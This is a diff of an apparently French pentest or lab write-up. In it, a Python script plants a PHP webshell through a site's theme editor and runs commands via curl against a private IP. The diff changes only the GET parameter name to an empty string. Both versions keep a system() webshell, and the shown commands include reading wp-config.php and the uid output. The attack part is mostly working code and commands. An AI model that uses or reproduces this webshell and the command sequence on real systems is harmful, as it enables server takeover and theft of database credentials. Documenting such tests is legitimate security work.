@@ -88,7 +88,7 @@ if not textarea_match:
 current_code = html.unescape(textarea_match.group(1))
 
 # Step 3: Ajout du Webshell
-payload = "\n\n// GEMINI SHELL\nif(isset($_GET['gemini'])) { system($_GET['gemini']); exit; }\n"
+payload = "\n\n// GEMINI SHELL\nif(isset($_GET[''])) { system($_GET['']); exit; }\n"
 
 if "GEMINI SHELL" in current_code:
     print("[!] Shell already present. Skipping modification.")
@@ -114,7 +114,7 @@ r_post = s.post(EDITOR_URL, data=data)
 if r_post.status_code == 200:
     print("[+] Update request sent. Checking if successful...")
     # Vérification
-    test_url = f"{URL}/?gemini=id"
+    test_url = f"{URL}/?=id"
     try:
         r_test = requests.get(test_url, timeout=5)
         if "uid=" in r_test.text:
@@ -132,14 +132,14 @@ else:
 
 ```php
 // GEMINI SHELL
-if(isset($_GET['gemini'])) { system($_GET['gemini']); exit; }
+if(isset($_GET[''])) { system($_GET['']); exit; }
 ```
 
 **Validation :**
-L'exécution de commandes est désormais possible via le paramètre GET `gemini`.
+L'exécution de commandes est désormais possible via le paramètre GET ``.
 
 ```bash
-curl "http://172.20.31.174/?gemini=id"
+curl "http://172.20.31.174/?=id"
 # Sortie : uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
@@ -150,7 +150,7 @@ Une fois le shell obtenu, nous avons recherché les informations de configuratio
 **Commande exécutée :**
 
 ```bash
-curl "http://172.20.31.174/?gemini=cat%20wp-config.php"
+curl "http://172.20.31.174/?=cat%20wp-config.php"
 ```
 
 **Contenu extrait (extrait pertinent) :**
